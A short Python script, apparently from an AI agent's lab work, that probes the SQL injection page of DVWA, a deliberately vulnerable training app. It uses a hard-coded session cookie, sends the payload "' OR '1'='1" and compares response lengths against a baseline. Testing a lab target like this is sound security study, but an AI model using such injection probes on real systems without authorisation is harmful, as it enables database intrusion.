import requests

# Use the cookie provided by the user
cookies = {'PHPSESSID': 'g4lf3381t4oikauihrv5k69t70', 'security': 'low'}

url = 'http://localhost:5000/vulnerabilities/sqli/'  # inside docker, port 80? Wait, the target is dvwa:80
url = 'http://dvwa:80/vulnerabilities/sqli/'

# Baseline
res_baseline = requests.get(url, params={'id': 'test', 'Submit': 'Submit'}, cookies=cookies)
print(f"Baseline length: {len(res_baseline.text)}")

# Test
res_test = requests.get(url, params={'id': "' OR '1'='1", 'Submit': 'Submit'}, cookies=cookies)
print(f"Test length: {len(res_test.text)}")

diff = abs(len(res_test.text) - len(res_baseline.text))
ratio = diff / len(res_baseline.text) if len(res_baseline.text) > 0 else 0
print(f"Difference: {diff} bytes")
print(f"Ratio: {ratio:.4f} ({ratio*100:.2f}%)")
